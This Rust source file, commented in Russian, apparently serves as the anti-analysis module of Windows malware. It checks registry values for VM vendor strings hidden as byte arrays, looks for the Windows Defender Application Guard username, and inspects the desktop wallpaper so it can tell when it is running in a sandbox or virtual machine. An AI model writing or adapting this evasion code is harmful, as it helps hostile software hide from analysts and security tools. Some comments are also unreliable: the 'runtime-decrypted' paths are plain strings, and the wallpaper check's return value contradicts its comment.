use std::env;
use std::fs;
use std::path::Path;
use winapi::um::winreg::{RegOpenKeyExA, RegQueryValueExA, HKEY_LOCAL_MACHINE};
use winapi::um::winnt::{KEY_READ, REG_SZ};
use winapi::shared::winerror::ERROR_SUCCESS;
use std::ptr;

// проверяем реестр на следы виртуалок
pub fn check_registry() -> bool {
    // пути декриптуем в рантайме
    let path1: String = "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0\0".chars().collect();
    let path2: String = "HARDWARE\\Description\\System\0".chars().collect();
    let path3: String = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\0".chars().collect();
    let path4: String = "SYSTEM\\ControlSet001\\Services\\Disk\\Enum\0".chars().collect();

    let reg_key_paths = [
        path1.as_str(),
        path2.as_str(),
        path3.as_str(),
        path4.as_str(),
    ];

    let value_names = [
        "SystemBiosVersion\0",
        "VideoBiosVersion\0",
        "Identifier\0",
        "SystemManufacturer\0",
        "SystemProductName\0",
        "0\0",
    ];

    // индикаторы VM, декриптуем в рантайме
    let vm_indicators_enc: &[&[u8]] = &[
        &[86, 77, 119, 97, 114, 101], // VMware
        &[86, 105, 114, 116, 117, 97, 108], // Virtual
        &[81, 69, 77, 85], // QEMU
        &[88, 101, 110], // Xen
        &[75, 86, 77], // KVM
        &[86, 66, 79, 88], // VBOX
        &[79, 114, 97, 99, 108, 101], // Oracle
        &[80, 97, 114, 97, 108, 108, 101, 108, 115], // Parallels
        &[86, 105, 114, 116, 117, 97, 108, 32, 72, 68], // Virtual HD
        &[82, 101, 100, 32, 72, 97, 116], // Red Hat
        &[86, 105, 114, 116, 117, 97, 108, 105, 122, 101, 100], // Virtualized
        &[105, 110, 110, 111, 116, 101, 107], // innotek
    ];

    let mut vm_indicators = Vec::new();
    for enc in vm_indicators_enc {
        let s: String = enc.iter().map(|&b| b as char).collect();
        vm_indicators.push(s);
    }

    for path in &reg_key_paths {
        unsafe {
            let mut hkey = ptr::null_mut();
            if RegOpenKeyExA(
                HKEY_LOCAL_MACHINE,
                path.as_ptr() as *const i8,
                0,
                KEY_READ,
                &mut hkey,
            ) == ERROR_SUCCESS as i32 {

                let mut buffer = [0u8; 256];

                for val_name in &value_names {
                    let mut data_size = buffer.len() as u32;
                    let mut val_type = 0;

                    if RegQueryValueExA(
                        hkey,
                        val_name.as_ptr() as *const i8,
                        ptr::null_mut(),
                        &mut val_type,
                        buffer.as_mut_ptr(),
                        &mut data_size,
                    ) == ERROR_SUCCESS as i32 {
                        if val_type == REG_SZ && data_size > 0 {
                            let value_str = String::from_utf8_lossy(&buffer[..data_size as usize]).to_lowercase();
                            for indicator in &vm_indicators {
                                if value_str.contains(&indicator.to_lowercase()) {
                                    winapi::um::winreg::RegCloseKey(hkey);
                                    return true;
                                }
                            }
                        }
                    }
                }
                winapi::um::winreg::RegCloseKey(hkey);
            }
        }
    }

    false
}

// проверяем имя юзера, у WDAG своё характерное
pub fn check_username() -> bool {
    let suspicious_user_enc: &[u8] = &[119, 100, 97, 103, 117, 116, 105, 108, 105, 116, 121, 100, 111, 103, 48, 118, 97, 54, 110, 57];
    let suspicious_user: String = suspicious_user_enc.iter().map(|&b| b as char).collect();

    if let Ok(username) = env::var("USERNAME") {
        return username.eq_ignore_ascii_case(&suspicious_user);
    }
    false
}

// пустые обои или мелкий файл - sandbox
pub fn check_wallpaper() -> bool {
    unsafe {
        let mut hkey = ptr::null_mut();
        let path = "Control Panel\\Desktop\0";
        if RegOpenKeyExA(
            winapi::um::winreg::HKEY_CURRENT_USER,
            path.as_ptr() as *const i8,
            0,
            KEY_READ,
            &mut hkey,
        ) == ERROR_SUCCESS as i32 {
            let mut buffer = [0u8; 260];
            let mut data_size = buffer.len() as u32;
            let val_name = "Wallpaper\0";

            if RegQueryValueExA(
                hkey,
                val_name.as_ptr() as *const i8,
                ptr::null_mut(),
                ptr::null_mut(),
                buffer.as_mut_ptr(),
                &mut data_size,
            ) == ERROR_SUCCESS as i32 {
                winapi::um::winreg::RegCloseKey(hkey);

                let wp_path = String::from_utf8_lossy(&buffer[..data_size as usize])
                    .trim_matches(char::from(0))
                    .to_string();

                if wp_path.is_empty() {
                    return false;
                }

                if let Ok(content) = fs::read(Path::new(&wp_path)) {
                    if content.len() < 64 {
                        return false;
                    }

                    // проверяем сигнатуру jpeg/png
                    let is_jpeg = content[0] == 0xFF && content[1] == 0xD8 && content[2] == 0xFF;
                    let is_png = content[0] == 0x89 && content[1] == 0x50 && content[2] == 0x4E && content[3] == 0x47;

                    return is_jpeg || is_png;
                }
                return false;
            }
            winapi::um::winreg::RegCloseKey(hkey);
        }
    }
    false
}
